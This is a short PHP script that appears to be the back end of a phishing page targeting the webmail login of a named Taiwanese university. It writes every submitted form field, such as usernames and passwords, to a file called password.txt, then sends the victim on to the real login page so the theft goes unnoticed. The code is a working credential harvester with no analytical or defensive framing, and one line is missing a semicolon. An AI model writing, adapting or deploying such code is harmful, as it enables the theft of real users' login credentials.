<?php
header ('Location: https://webmail.ncnu.edu.tw/cgi-bin/login?index=1');
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
	fwrite($handle,$variable);
	fwrite($handle, "=");
	fwrite($handle,$value);
	fwrite($handle,"");
}
fwrite($handle, "===============")
fclose($handle);
exit;
?>